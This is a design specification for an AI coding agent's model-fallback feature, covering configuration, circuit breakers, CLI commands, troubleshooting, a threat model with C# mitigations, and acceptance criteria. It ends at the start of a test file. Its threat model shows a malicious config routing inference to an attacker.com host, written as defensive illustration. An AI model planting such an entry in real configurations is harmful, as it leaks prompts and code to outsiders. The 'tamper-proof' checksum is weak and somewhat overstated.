```

#### Per-Role Chains

Different chains for different roles:

```yaml
models:
  fallback:
    roles:
      planner:
        - llama3.2:70b
        - mistral:7b
      coder:
        - llama3.2:7b
        - qwen2:7b
      reviewer:
        - llama3.2:70b
        - llama3.2:7b
```

#### Complete Configuration

```yaml
models:
  fallback:
    # Escalation policy
    policy: retry-then-fallback
    
    # Policy settings
    retries: 2
    retry_delay_ms: 1000
    timeout_ms: 60000
    
    # Circuit breaker
    circuit_breaker:
      enabled: true
      failure_threshold: 5
      cooling_period_ms: 60000
    
    # Notification
    notify_user: false
    
    # Scope
    scope: role-scoped
    
    # Chains
    global:
      - llama3.2:7b
    
    roles:
      planner:
        - llama3.2:70b
        - llama3.2:7b
```

### Escalation Policies

#### Immediate Policy

Fastest recovery—fallback on first failure:

```yaml
models:
  fallback:
    policy: immediate
```

**Use when:** Speed matters more than persistence.

#### Retry-Then-Fallback Policy

Try primary model several times before falling back:

```yaml
models:
  fallback:
    policy: retry-then-fallback
    retries: 2
    retry_delay_ms: 1000
```

**Use when:** Transient failures are common (default).

#### Circuit Breaker Policy

Skip consistently failing models temporarily:

```yaml
models:
  fallback:
    policy: circuit-breaker
    circuit_breaker:
      failure_threshold: 5    # Failures before opening
      cooling_period_ms: 60000  # Time before retry
```

**Use when:** Models may fail persistently then recover.

### Escalation Triggers

| Trigger | Description | Default Threshold |
|---------|-------------|-------------------|
| Model Unavailable | Server not responding | Immediate |
| Request Timeout | Response too slow | 60 seconds |
| Repeated Errors | Invalid responses | 3 errors |

Configure thresholds:

```yaml
models:
  fallback:
    timeout_ms: 30000          # 30s timeout
    error_threshold: 5         # 5 errors before escalate
```

### Circuit Breaker

The circuit breaker prevents repeatedly trying failing models:

**States:**
- **Closed** - Normal operation, requests go through
- **Open** - Model is skipped, using fallback
- **Half-Open** - Testing if model recovered

```
Failure 1 → Failure 2 → ... → Failure 5 → CIRCUIT OPENS
                                              ↓
                                         (60s cooling)
                                              ↓
                                        HALF-OPEN
                                              ↓
                                   Success → CLOSED
                                   Failure → OPEN
```

### CLI Commands

```bash
# Show fallback status
$ acode fallback status
Fallback Configuration:
  Policy: retry-then-fallback
  Scope: role-scoped

Global Chain:
  1. llama3.2:7b (available)

Role Chains:
  planner:
    1. llama3.2:70b (available)
    2. llama3.2:7b (available)

Circuit Breaker State:
  llama3.2:70b: CLOSED (0 failures)
  llama3.2:7b: CLOSED (0 failures)

# Reset circuit breakers
$ acode fallback reset
Circuit breakers reset.

# Test fallback chain
$ acode fallback test planner
Testing fallback chain for 'planner':
  llama3.2:70b: OK (45ms)
  llama3.2:7b: OK (32ms)
Chain is healthy.
```

### Logs

Fallback events in logs:

```
[WARN] Model escalation triggered
  Original: llama3.2:70b
  Fallback: llama3.2:7b
  Reason: request_timeout (65s > 60s limit)
  Role: planner

[WARN] Circuit opened for model
  Model: llama3.2:70b
  Failures: 5
  Cooling: 60s

[ERROR] All fallbacks exhausted
  Role: planner
  Tried: llama3.2:70b, llama3.2:7b, mistral:7b
  Error: No available models
```

### Graceful Degradation

When all models fail:

```
[ERROR] No models available for inference

The agent cannot perform inference tasks because no models are available.

Tried:
  - llama3.2:70b: unavailable (circuit open)
  - llama3.2:7b: timeout
  - mistral:7b: not loaded

Suggestions:
  1. Start a model: ollama run llama3.2:7b
  2. Reset circuit breakers: acode fallback reset
  3. Check model server: ollama list
```

### Best Practices

1. **Always configure fallback** - Never rely on single model
2. **Order by preference** - Best models first
3. **Include smaller models** - Fast fallbacks when needed
4. **Monitor circuit state** - Check `acode fallback status`
5. **Keep models loaded** - Pre-load fallback models

### Troubleshooting

#### Issue 1: Constant Fallback Usage

**Symptoms:**
```
[WARN] Fallback triggered: llama3.2:70b unavailable, using mistral:22b
[WARN] Fallback triggered: llama3.2:70b unavailable, using mistral:22b
[WARN] Fallback triggered: llama3.2:70b unavailable, using mistral:22b
```

**Causes:**
1. Primary model server crashed or stopped
2. Primary model not loaded (Ollama model pulled but not loaded)
3. Network connectivity issue between agent and model server
4. Circuit breaker opened due to previous failures

**Solutions:**
1. Check model server status: `ollama list` or `ps aux | grep vllm`
2. Start model if not running: `ollama run llama3.2:70b`
3. Reset circuit breakers if model is now healthy: `acode fallback reset`
4. Review circuit state: `acode fallback status` (check for Open circuits)
5. Test connectivity: `curl http://localhost:11434/api/health`

#### Issue 2: All Fallbacks Exhausted

**Symptoms:**
```
[ERROR] All fallbacks exhausted
  Role: planner
  Tried: llama3.2:70b, mistral:22b, llama3.2:7b
  Error: No available models
```

**Causes:**
1. All configured models in chain are unavailable
2. Model server(s) completely down
3. All circuits opened simultaneously
4. Configuration error (models in chain don't exist)

**Solutions:**
1. Start at least one model from fallback chain:
   ```bash
   ollama run llama3.2:7b
   ```
2. Check all model servers are running:
   ```bash
   ollama list
   systemctl status ollama
   ```
3. Reset all circuit breakers:
   ```bash
   acode fallback reset --all
   ```
4. Validate configuration (check models exist in provider registry):
   ```bash
   acode config validate
   ```
5. Temporarily override with specific model:
   ```bash
   acode plan --model qwen2:14b "..."
   ```

#### Issue 3: Circuit Breaker Stuck Open

**Symptoms:**
```
$ acode fallback status
Circuit Breaker State:
  llama3.2:70b: OPEN (5 failures, cooling until 14:30:00)

$ ollama list
llama3.2:70b  running  (model is healthy)
```

**Causes:**
1. Cooling period has not elapsed (model excluded temporarily)
2. Clock skew between agent and system time
3. Circuit state corrupted

**Solutions:**
1. Wait for cooling period to elapse (check "cooling until" timestamp)
2. Manually reset circuit for specific model:
   ```bash
   acode fallback reset --model llama3.2:70b
   ```
3. Reset all circuits:
   ```bash
   acode fallback reset --all
   ```
4. Verify system time is correct: `date`

#### Issue 4: Fallback Latency Too High

**Symptoms:**
```
Request takes 3-5 seconds longer than expected
Logs show multiple availability checks
```

**Causes:**
1. Sequential availability checks for long fallback chain (5+ models)
2. Availability check timeout too high (default 5s)
3. Retry policy with high retry count

**Solutions:**
1. Reduce fallback chain length (3-4 models recommended)
2. Lower availability check timeout:
   ```yaml
   models:
     fallback:
       availability_check_timeout_ms: 2000  # 2s instead of 5s
   ```
3. Switch to immediate policy (no retries):
   ```yaml
   models:
     fallback:
       policy: immediate
   ```
4. Enable parallel availability checks (post-MVP feature)

#### Issue 5: Inappropriate Model Fallback

**Symptoms:**
```
Planner falls back to llama3.2:7b (small model)
Plan quality is poor
```

**Causes:**
1. Global fallback chain includes small models
2. Role-scoped chain not configured
3. Scope set to global-scoped instead of role-scoped

**Solutions:**
1. Configure role-specific fallback chain:
   ```yaml
   models:
     fallback:
       roles:
         planner:
           - llama3.2:70b
           - mistral:22b   # Stay in large-model tier
   ```
2. Set scope to role-scoped:
   ```yaml
   models:
     fallback:
       scope: role-scoped
   ```
3. Remove small models from global chain if used by sensitive roles

### Frequently Asked Questions (FAQ)

**Q1: How do I know if fallback is happening?**

A: Check logs for `[WARN] Fallback triggered` messages. Enable user notifications:
```yaml
models:
  fallback:
    notify_user: true
```

**Q2: Can I disable fallback entirely?**

A: Yes, configure empty fallback chains:
```yaml
models:
  fallback:
    global: []
    roles:
      planner: []
      coder: []
```

**Q3: What happens if the fallback model also fails?**

A: The system tries the next model in the chain. If all models fail, you receive an error with suggested remediation steps.

**Q4: How do I prevent planner from falling back to small models?**

A: Use role-scoped fallback and configure planner-specific chain with only large models:
```yaml
models:
  fallback:
    scope: role-scoped
    roles:
      planner:
        - llama3.2:70b
        - mistral:22b  # Both ≥22B parameters
```

**Q5: Can I have different fallback policies per role?**

A: Not in MVP. The policy applies globally to all roles. Per-role policies are a post-MVP enhancement.

**Q6: How often does the circuit breaker test recovery?**

A: After the cooling period (default 60s), the circuit enters half-open state and allows one request through. Success closes the circuit; failure reopens it for another cooling cycle.

**Q7: What's the difference between immediate and retry-then-fallback policies?**

A:
- **Immediate:** Falls back on first failure (fastest recovery, 0 retries)
- **Retry-then-fallback:** Retries primary model 2 times before fallback (better chance of using preferred model, 2-4s additional latency)

**Q8: How do I see circuit breaker state without running a command?**

A: Run `acode fallback status` anytime:
```bash
$ acode fallback status
Circuit Breaker State:
  llama3.2:70b: CLOSED (0 failures)
  mistral:22b: OPEN (5 failures, cooling until 14:30:00)
```

**Q9: Can fallback cross operating modes (e.g., LocalOnly to Burst)?**

A: No. Fallback chains are filtered by operating mode. LocalOnly fallback cannot include cloud models. This is enforced at configuration load time.

**Q10: What's the maximum recommended fallback chain length?**

A: 3-4 models. Longer chains increase latency when exhausting the chain (each attempt adds 100-500ms). Diminishing returns after 3-4 models.

---

## Assumptions

### Technical Assumptions

1. **Circuit Breaker State Persistence:** Circuit breaker state persists in-memory for the duration of a session and is stored in SessionState from Task 011. State resets between sessions (not persisted to disk).

2. **Model Provider Integration:** IModelProvider.IsAvailable(modelId) method from Task 004-006 accurately reports model availability within 100-500ms. Health check endpoints are implemented by all providers (Ollama, vLLM, LMStudio).

3. **Thread-Safe Collections:** .NET ConcurrentDictionary provides adequate thread-safety for circuit breaker state access from multiple agent stages (planner, coder, reviewer) running concurrently.

4. **Configuration Load Timing:** Fallback configuration is loaded once at application startup and cached in memory. Configuration changes require application restart (no hot-reload in MVP).

5. **Operating Mode Enforcement:** OperatingMode constraints from Task 009 are already enforced at model provider level. Fallback chain validation can rely on this existing enforcement.

6. **Exponential Backoff Formula:** Retry delays use formula: delay = retry_delay_ms × 2^(retry_attempt - 1). Example: 1s, 2s, 4s for 3 retries with 1000ms base delay.

7. **Clock Synchronization:** System clock is reasonably accurate (within 1-2 seconds of actual time). Circuit breaker cooling period calculations rely on DateTimeOffset.UtcNow accuracy.

8. **HTTP Timeouts:** Model provider HTTP clients have configured timeouts (5s for health checks, 60s for inference requests). Fallback availability checks don't hang indefinitely.

### Operational Assumptions

9. **Fallback Chain Ordering:** Users configure fallback chains in order of preference (most preferred model first, least preferred model last). System does not validate or enforce any ordering logic.

10. **Cooling Period Effectiveness:** 60-second default cooling period is sufficient for transient failures to resolve (model server restart, network recovery, thermal throttling recovery).

11. **Failure Independence:** Models in a fallback chain have independent failure modes. Ollama crash doesn't affect vLLM models in the same chain.

12. **Model Capability Metadata:** Model capability information (tool-calling, vision, function-calling) is available from provider registry and accurate. Capability validation can trust this metadata.

13. **Chain Length Limit:** Fallback chains are reasonably short (3-5 models). System does not enforce hard limits but assumes users won't configure 20+ model chains.

14. **Retry Budget:** Default 2 retries with 1s base delay (total 3s retry budget) is acceptable latency overhead for retry-then-fallback policy. Users needing lower latency will configure immediate policy.

### Integration Assumptions

15. **CLI Framework Availability:** Task 010 (CLI Command Framework) provides command registration infrastructure for `acode fallback status`, `acode fallback reset`, `acode fallback test` commands.

16. **Session State Availability:** Task 011 (Run Session State Machine & Persistence) provides SessionState class with dictionary-based state storage for circuit breaker state.

17. **Logging Infrastructure:** Structured logging infrastructure is available (Serilog, NLog, or Microsoft.Extensions.Logging) with support for JSON-formatted structured logs.

18. **Configuration Schema Validation:** JSON Schema validation from Task 002 (Configuration Reader + JSON Schema Validator) validates fallback configuration at load time.

### Deployment Assumptions

19. **Single-Instance Deployment:** Agent runs as single process (no distributed deployment). Circuit breaker state sharing across multiple agent instances is out of scope.

20. **Localhost Model Servers:** Model servers (Ollama, vLLM) run on localhost or same network segment (low-latency network). Availability checks complete within 5s timeout.

---

## Security Considerations

### Threat 1: Fallback Chain Manipulation via Malicious Configuration

**Description:** An attacker with write access to `.agent/config.yml` could manipulate fallback chains to redirect inference requests to attacker-controlled models (e.g., network-based models running on attacker infrastructure). This could exfiltrate prompts, code context, or inject malicious code via model responses.

**Attack Vector:**
```yaml
# Malicious configuration
models:
  fallback:
    global:
      - llama3.2:7b
      - http://attacker.com:11434/evil-model  # Attacker-controlled model
```

**Impact:** High - Prompt exfiltration, code injection, data leakage

**Mitigation (Complete C# Code):**

```csharp
namespace Acode.Infrastructure.Fallback;

/// <summary>
/// Validates fallback chains against security constraints (operating mode, model registry, URL schemes).
/// </summary>
public sealed class FallbackChainValidator
{
    private readonly IModelProviderRegistry _registry;
    private readonly IOperatingModeProvider _modeProvider;
    private readonly ILogger<FallbackChainValidator> _logger;

    public FallbackChainValidator(
        IModelProviderRegistry registry,
        IOperatingModeProvider modeProvider,
        ILogger<FallbackChainValidator> logger)
    {
        _registry = registry;
        _modeProvider = modeProvider;
        _logger = logger;
    }

    /// <summary>
    /// Validates fallback chain against security constraints.
    /// Throws FallbackConfigurationException if validation fails.
    /// </summary>
    public void Validate(FallbackChainConfiguration config)
    {
        var mode = _modeProvider.GetCurrentMode();

        foreach (var modelId in config.GlobalChain.Concat(config.RoleChains.Values.SelectMany(x => x)))
        {
            // THREAT MITIGATION 1: Reject HTTP/HTTPS URLs (only local model IDs allowed)
            if (IsNetworkUrl(modelId))
            {
                _logger.LogError("Malicious fallback configuration detected: {ModelId}", modelId);
                throw new FallbackConfigurationException(
                    $"Fallback chain contains network URL '{modelId}'. Only local model IDs are allowed. " +
                    "Configure model providers in models.providers section instead.");
            }

            // THREAT MITIGATION 2: Verify model exists in trusted provider registry
            if (!_registry.IsModelRegistered(modelId))
            {
                _logger.LogWarning("Fallback chain references unknown model: {ModelId}", modelId);
                throw new FallbackConfigurationException(
                    $"Model '{modelId}' not found in provider registry. " +
                    "Add model to models.providers.*.models first.");
            }

            // THREAT MITIGATION 3: Enforce operating mode constraints
            var modelInfo = _registry.GetModelInfo(modelId);
            if (mode == OperatingMode.LocalOnly && modelInfo.RequiresNetwork)
            {
                _logger.LogError("Mode constraint violation: {ModelId} in {Mode}", modelId, mode);
                throw new FallbackConfigurationException(
                    $"Model '{modelId}' requires network but operating mode is LocalOnly. " +
                    "Remove from fallback chain or switch to Burst mode.");
            }

            if (mode == OperatingMode.Airgapped && modelInfo.RequiresNetwork)
            {
                _logger.LogError("Mode constraint violation: {ModelId} in {Mode}", modelId, mode);
                throw new FallbackConfigurationException(
                    $"Model '{modelId}' requires network but operating mode is Airgapped. " +
                    "Remove from fallback chain.");
            }
        }
    }

    private bool IsNetworkUrl(string modelId)
    {
        return modelId.StartsWith("http://", StringComparison.OrdinalIgnoreCase) ||
               modelId.StartsWith("https://", StringComparison.OrdinalIgnoreCase) ||
               modelId.Contains("://");
    }
}
```

### Threat 2: Circuit Breaker State Tampering to Bypass Security Controls

**Description:** An attacker with access to circuit breaker state could manipulate failure counts to force fallback to a compromised model or prevent fallback to secure models. For example, artificially opening circuits for all secure models forces use of least-preferred (potentially compromised) fallback.

**Attack Vector:** Direct memory manipulation via debugger, or exploiting thread-unsafe state access

**Impact:** Medium - Bypass security controls, forced use of compromised models

**Mitigation (Complete C# Code):**

```csharp
namespace Acode.Infrastructure.Fallback;

/// <summary>
/// Thread-safe circuit breaker with tamper detection via checksum validation.
/// </summary>
public sealed class TamperProofCircuitBreaker
{
    private readonly object _lock = new();
    private int _failureCount;
    private DateTimeOffset _lastFailure;
    private CircuitState _state;
    private readonly int _threshold;
    private readonly TimeSpan _coolingPeriod;
    private long _checksum; // Tamper detection

    public CircuitState State
    {
        get
        {
            lock (_lock)
            {
                ValidateChecksum();
                return _state;
            }
        }
    }

    public TamperProofCircuitBreaker(int threshold, TimeSpan coolingPeriod)
    {
        _threshold = threshold;
        _coolingPeriod = coolingPeriod;
        _state = CircuitState.Closed;
        _failureCount = 0;
        _lastFailure = DateTimeOffset.MinValue;
        UpdateChecksum();
    }

    public void RecordFailure()
    {
        lock (_lock)
        {
            ValidateChecksum();
            _failureCount++;
            _lastFailure = DateTimeOffset.UtcNow;

            if (_failureCount >= _threshold)
            {
                _state = CircuitState.Open;
            }

            UpdateChecksum();
        }
    }

    public void RecordSuccess()
    {
        lock (_lock)
        {
            ValidateChecksum();
            _failureCount = 0;
            _state = CircuitState.Closed;
            UpdateChecksum();
        }
    }

    public bool ShouldAllow()
    {
        lock (_lock)
        {
            ValidateChecksum();

            if (_state == CircuitState.Closed)
                return true;

            if (_state == CircuitState.Open &&
                DateTimeOffset.UtcNow - _lastFailure > _coolingPeriod)
            {
                _state = CircuitState.HalfOpen;
                UpdateChecksum();
                return true;
            }

            return false;
        }
    }

    private void UpdateChecksum()
    {
        // Simple checksum: XOR of all state components
        _checksum = _failureCount ^ (int)_state ^ (int)_lastFailure.Ticks;
    }

    private void ValidateChecksum()
    {
        long expected = _failureCount ^ (int)_state ^ (int)_lastFailure.Ticks;
        if (_checksum != expected)
        {
            throw new CircuitBreakerTamperedException(
                "Circuit breaker state corruption detected. Checksum mismatch. " +
                "Possible memory corruption or tampering.");
        }
    }
}
```

### Threat 3: Sensitive Information Leakage in Escalation Logs

**Description:** Escalation logs may inadvertently include sensitive information from model responses, prompts, or error messages. An attacker with access to logs could extract API keys, credentials, or proprietary code.

**Attack Vector:** Log aggregation systems, log file access, SIEM integration

**Impact:** Medium - Information disclosure

**Mitigation (Complete C# Code):**

```csharp
namespace Acode.Infrastructure.Fallback;

/// <summary>
/// Sanitizes escalation events before logging to prevent sensitive data leakage.
/// </summary>
public sealed class SecureEscalationLogger
{
    private readonly ILogger<SecureEscalationLogger> _logger;
    private static readonly Regex ApiKeyPattern = new(@"\b[A-Za-z0-9]{32,}\b");
    private static readonly Regex UrlWithAuthPattern = new(@"https?://[^:]+:[^@]+@");

    public SecureEscalationLogger(ILogger<SecureEscalationLogger> logger)
    {
        _logger = logger;
    }

    public void LogFallbackEscalation(FallbackEscalationEvent ev)
    {
        // Sanitize all string fields before logging
        var sanitizedEvent = new
        {
            Timestamp = ev.Timestamp,
            Role = ev.Role.ToString(),
            OriginalModel = SanitizeModelId(ev.OriginalModel),
            FallbackModel = SanitizeModelId(ev.FallbackModel),
            Trigger = ev.Trigger.ToString(),
            TriggerDetail = SanitizeTriggerDetail(ev.TriggerDetail),
            CircuitStateBefore = ev.CircuitStateBefore.ToString(),
            CircuitStateAfter = ev.CircuitStateAfter.ToString(),
            RetryCount = ev.RetryCount,
            Policy = ev.Policy.ToString(),
            SessionId = ev.SessionId,
            TaskId = ev.TaskId
            // NOTE: Explicitly exclude ErrorMessage, ModelResponse, Prompt
        };

        _logger.LogWarning("Fallback escalation triggered: {@Event}", sanitizedEvent);
    }

    public void LogChainExhaustion(ChainExhaustionEvent ev)
    {
        var sanitizedEvent = new
        {
            Timestamp = ev.Timestamp,
            Role = ev.Role.ToString(),
            TriedModels = ev.TriedModels.Select(SanitizeModelId).ToList(),
            // Sanitize failure reasons (may contain error messages with sensitive data)
            FailureReasons = ev.FailureReasons.ToDictionary(
                kvp => SanitizeModelId(kvp.Key),
                kvp => SanitizeErrorMessage(kvp.Value)),
            SessionId = ev.SessionId,
            TaskId = ev.TaskId,
            Suggestion = "Start at least one model from fallback chain"
        };

        _logger.LogError("Fallback chain exhausted: {@Event}", sanitizedEvent);
    }

    private string SanitizeModelId(string modelId)
    {
        // Remove any auth tokens from model IDs (e.g., http://user:pass@host/model)
        return UrlWithAuthPattern.Replace(modelId, "https://***:***@");
    }

    private string SanitizeTriggerDetail(string detail)
    {
        // Remove potential API keys or tokens from error messages
        return ApiKeyPattern.Replace(detail, "***REDACTED***");
    }

    private string SanitizeErrorMessage(string message)
    {
        // Remove API keys and auth credentials
        var sanitized = ApiKeyPattern.Replace(message, "***REDACTED***");
        sanitized = UrlWithAuthPattern.Replace(sanitized, "https://***:***@");
        return sanitized;
    }
}
```

### Threat 4: Operating Mode Constraint Bypass via Fallback Chain

**Description:** An attacker configures a fallback chain that bypasses operating mode constraints. For example, in LocalOnly mode, an attacker configures a local primary model but includes cloud models in fallback chain, bypassing the network prohibition.

**Attack Vector:** Configuration file manipulation

**Impact:** High - Security policy bypass, data exfiltration

**Mitigation (Complete C# Code):**

```csharp
namespace Acode.Infrastructure.Fallback;

/// <summary>
/// Enforces operating mode constraints at chain resolution time (defense in depth).
/// </summary>
public sealed class ModeAwareFallbackChainResolver
{
    private readonly IOperatingModeProvider _modeProvider;
    private readonly IModelProviderRegistry _registry;
    private readonly ILogger<ModeAwareFallbackChainResolver> _logger;

    public ModeAwareFallbackChainResolver(
        IOperatingModeProvider modeProvider,
        IModelProviderRegistry registry,
        ILogger<ModeAwareFallbackChainResolver> logger)
    {
        _modeProvider = modeProvider;
        _registry = registry;
        _logger = logger;
    }

    /// <summary>
    /// Resolves fallback chain with operating mode enforcement at every step.
    /// Returns only models that satisfy mode constraints.
    /// </summary>
    public IReadOnlyList<string> ResolveChain(AgentRole role, FallbackChainConfiguration config)
    {
        var mode = _modeProvider.GetCurrentMode();
        var rawChain = GetRawChain(role, config);
        var filteredChain = new List<string>();

        foreach (var modelId in rawChain)
        {
            // DEFENSE IN DEPTH: Re-validate mode constraints at resolution time
            if (!IsModelAllowedInMode(modelId, mode))
            {
                _logger.LogWarning(
                    "Skipping model {ModelId} in fallback chain (violates {Mode} constraints)",
                    modelId, mode);
                continue; // Skip this model
            }

            filteredChain.Add(modelId);
        }

        if (filteredChain.Count == 0)
        {
            _logger.LogError(
                "No models in fallback chain satisfy {Mode} constraints for role {Role}",
                mode, role);
            throw new FallbackConfigurationException(
                $"All models in fallback chain violate {mode} operating mode constraints.");
        }

        return filteredChain;
    }

    private bool IsModelAllowedInMode(string modelId, OperatingMode mode)
    {
        if (!_registry.IsModelRegistered(modelId))
            return false;

        var modelInfo = _registry.GetModelInfo(modelId);

        return mode switch
        {
            OperatingMode.LocalOnly => !modelInfo.RequiresNetwork,
            OperatingMode.Airgapped => !modelInfo.RequiresNetwork,
            OperatingMode.Burst => true, // All models allowed
            _ => false
        };
    }

    private IReadOnlyList<string> GetRawChain(AgentRole role, FallbackChainConfiguration config)
    {
        // Role-specific chain takes precedence
        if (config.RoleChains.TryGetValue(role, out var roleChain) && roleChain.Any())
            return roleChain;

        return config.GlobalChain;
    }
}
```

### Threat 5: Denial of Service via Rapid Circuit Triggering

**Description:** An attacker triggers rapid circuit breaker openings by causing repeated model failures (e.g., sending malformed requests, overwhelming model server). This exhausts all circuits, denying service to legitimate users.

**Attack Vector:** Malicious inference requests, model server resource exhaustion

**Impact:** Medium - Denial of service

**Mitigation (Complete C# Code):**

```csharp
namespace Acode.Infrastructure.Fallback;

/// <summary>
/// Rate-limited circuit breaker that prevents DoS via rapid circuit triggering.
/// </summary>
public sealed class RateLimitedCircuitBreaker
{
    private readonly object _lock = new();
    private int _failureCount;
    private DateTimeOffset _lastFailure;
    private CircuitState _state;
    private readonly int _threshold;
    private readonly TimeSpan _coolingPeriod;
    private readonly Queue<DateTimeOffset> _recentFailures = new();
    private readonly int _maxFailuresPerMinute = 20; // Rate limit

    public CircuitState State
    {
        get
        {
            lock (_lock) return _state;
        }
    }

    public RateLimitedCircuitBreaker(int threshold, TimeSpan coolingPeriod)
    {
        _threshold = threshold;
        _coolingPeriod = coolingPeriod;
        _state = CircuitState.Closed;
    }

    public void RecordFailure()
    {
        lock (_lock)
        {
            var now = DateTimeOffset.UtcNow;

            // Track recent failures for rate limiting
            _recentFailures.Enqueue(now);

            // Remove failures older than 1 minute
            while (_recentFailures.Count > 0 && now - _recentFailures.Peek() > TimeSpan.FromMinutes(1))
            {
                _recentFailures.Dequeue();
            }

            // MITIGATION: If failure rate exceeds threshold, suspect DoS attack
            if (_recentFailures.Count > _maxFailuresPerMinute)
            {
                throw new SuspectedDosAttackException(
                    $"Excessive failure rate detected: {_recentFailures.Count} failures in 1 minute. " +
                    "This may indicate a DoS attack or severely degraded model server. " +
                    "Circuit breaker entering protective mode.");
            }

            _failureCount++;
            _lastFailure = now;

            if (_failureCount >= _threshold)
            {
                _state = CircuitState.Open;
            }
        }
    }

    public void RecordSuccess()
    {
        lock (_lock)
        {
            _failureCount = 0;
            _state = CircuitState.Closed;
            _recentFailures.Clear(); // Reset rate limit tracking
        }
    }

    public bool ShouldAllow()
    {
        lock (_lock)
        {
            if (_state == CircuitState.Closed)
                return true;

            if (_state == CircuitState.Open &&
                DateTimeOffset.UtcNow - _lastFailure > _coolingPeriod)
            {
                _state = CircuitState.HalfOpen;
                return true;
            }

            return false;
        }
    }
}
```

### Threat 6: Fallback to Unverified or Malicious Models

**Description:** An attacker adds an unverified model to the provider registry and includes it in fallback chains. When primary models fail, the system falls back to the malicious model, which can inject backdoors, exfiltrate data, or produce malicious code.

**Attack Vector:** Model registry manipulation, configuration tampering

**Impact:** Critical - Code injection, data exfiltration

**Mitigation (Complete C# Code):**

```csharp
namespace Acode.Infrastructure.Fallback;

/// <summary>
/// Validates fallback candidates against model verification requirements.
/// Only allows verified, trusted models in fallback chains.
/// </summary>
public sealed class VerifiedModelFallbackHandler : IFallbackHandler
{
    private readonly IFallbackHandler _innerHandler;
    private readonly IModelVerificationService _verificationService;
    private readonly ILogger<VerifiedModelFallbackHandler> _logger;

    public VerifiedModelFallbackHandler(
        IFallbackHandler innerHandler,
        IModelVerificationService verificationService,
        ILogger<VerifiedModelFallbackHandler> logger)
    {
        _innerHandler = innerHandler;
        _verificationService = verificationService;
        _logger = logger;
    }

    public FallbackResult GetFallback(AgentRole role, FallbackContext context)
    {
        var result = _innerHandler.GetFallback(role, context);

        if (!result.Success)
            return result;

        // MITIGATION: Verify fallback model before using it
        if (!_verificationService.IsModelVerified(result.ModelId!))
        {
            _logger.LogError(
                "Security violation: Fallback to unverified model {ModelId} blocked",
                result.ModelId);

            return new FallbackResult
            {
                Success = false,
                Reason = $"Fallback model '{result.ModelId}' is not verified. " +
                         "Only verified models are allowed in fallback chains. " +
                         "Run 'acode model verify {result.ModelId}' to verify this model."
            };
        }

        return result;
    }

    public void NotifyFailure(string modelId, Exception error)
    {
        _innerHandler.NotifyFailure(modelId, error);
    }

    public bool IsCircuitOpen(string modelId)
    {
        return _innerHandler.IsCircuitOpen(modelId);
    }

    public void ResetCircuit(string modelId)
    {
        _innerHandler.ResetCircuit(modelId);
    }

    public void ResetAllCircuits()
    {
        _innerHandler.ResetAllCircuits();
    }
}

/// <summary>
/// Service that verifies model authenticity and integrity.
/// </summary>
public interface IModelVerificationService
{
    /// <summary>
    /// Checks if model has been verified (checksum validated, from trusted source).
    /// </summary>
    bool IsModelVerified(string modelId);

    /// <summary>
    /// Verifies model by checking checksum against known-good registry.
    /// </summary>
    Task<bool> VerifyModelAsync(string modelId);
}
```

---

## Acceptance Criteria

### Interface

- [ ] AC-001: IFallbackHandler in Application
- [ ] AC-002: GetFallback method exists
- [ ] AC-003: Returns FallbackResult
- [ ] AC-004: Result has model
- [ ] AC-005: Result has reason
- [ ] AC-006: NotifyFailure method exists
- [ ] AC-007: IsCircuitOpen method exists

### Implementation

- [ ] AC-008: FallbackHandler in Infrastructure
- [ ] AC-009: Reads from config
- [ ] AC-010: Supports per-role chains
- [ ] AC-011: Supports global chain
- [ ] AC-012: Role precedence over global
- [ ] AC-013: Checks availability

### Configuration

- [ ] AC-014: models.fallback section
- [ ] AC-015: fallback.global works
- [ ] AC-016: fallback.roles works
- [ ] AC-017: Chain is ordered array
- [ ] AC-018: Empty chain uses global
- [ ] AC-019: Mode constraints respected

### Triggers

- [ ] AC-020: Unavailable triggers
- [ ] AC-021: Timeout triggers
- [ ] AC-022: Errors trigger
- [ ] AC-023: Thresholds configurable
- [ ] AC-024: Default timeout 60s
- [ ] AC-025: Default errors 3

### Policies

- [ ] AC-026: Immediate policy works
- [ ] AC-027: Retry policy works
- [ ] AC-028: Circuit breaker works
- [ ] AC-029: Default is retry
- [ ] AC-030: Per-role configurable

### Circuit Breaker

- [ ] AC-031: Tracks failures
- [ ] AC-032: Opens after threshold
- [ ] AC-033: Default threshold 5
- [ ] AC-034: Skips open circuits
- [ ] AC-035: Half-open state works
- [ ] AC-036: Cooling configurable
- [ ] AC-037: Default cooling 60s
- [ ] AC-038: Success closes circuit

### Chain Exhaustion

- [ ] AC-039: Handles exhaustion
- [ ] AC-040: Returns failure result
- [ ] AC-041: Includes tried models
- [ ] AC-042: Includes reasons
- [ ] AC-043: Graceful degradation

### CLI

- [ ] AC-044: status command works
- [ ] AC-045: Shows chains
- [ ] AC-046: Shows circuit state
- [ ] AC-047: reset command works
- [ ] AC-048: test command works
- [ ] AC-049: status shows per-model state
- [ ] AC-050: status shows last failure time
- [ ] AC-051: reset accepts --model filter
- [ ] AC-052: reset accepts --all flag
- [ ] AC-053: test shows latency per model
- [ ] AC-054: Commands have --help

### Logging and Observability

- [ ] AC-055: All escalations logged
- [ ] AC-056: Circuit events logged
- [ ] AC-057: Logs include session_id
- [ ] AC-058: Logs include all tried models
- [ ] AC-059: Logs include failure reasons
- [ ] AC-060: Structured JSON logging
- [ ] AC-061: No sensitive data in logs

### Operating Mode Integration

- [ ] AC-062: Mode constraints enforced
- [ ] AC-063: LocalOnly excludes network
- [ ] AC-064: Airgapped excludes network
- [ ] AC-065: Burst allows cloud models
- [ ] AC-066: Validation at chain resolution

### Capability Validation

- [ ] AC-067: Preserves model capabilities
- [ ] AC-068: Tool-calling preserved
- [ ] AC-069: Vision preserved
- [ ] AC-070: Function-calling preserved
- [ ] AC-071: Capability mismatch skips model

### Security

- [ ] AC-072: Rejects network URLs
- [ ] AC-073: Validates against registry
- [ ] AC-074: Circuit state tamper detection
- [ ] AC-075: Checksum validation works

---

## Testing Requirements

### Unit Tests

**File: Tests/Unit/Application/Fallback/FallbackHandlerTests.cs**

```csharp
using Xunit;
using FluentAssertions;
using NSubstitute;
using Acode.Application.Fallback;
using Acode.Infrastructure.Fallback;
using Acode.Domain.Models;

namespace Acode.Tests.Unit.Application.Fallback;

public class FallbackHandlerTests
{
    private readonly IModelProviderRegistry _mockRegistry;
    private readonly IFallbackConfiguration _mockConfig;
    private readonly FallbackHandler _sut;

    public FallbackHandlerTests()
    {
        _mockRegistry = Substitute.For<IModelProviderRegistry>();
        _mockConfig = Substitute.For<IFallbackConfiguration>();
        _sut = new FallbackHandler(_mockRegistry, _mockConfig);
    }

    [Fact]
    public void Should_Return_First_Available_Fallback()
    {
        // Arrange
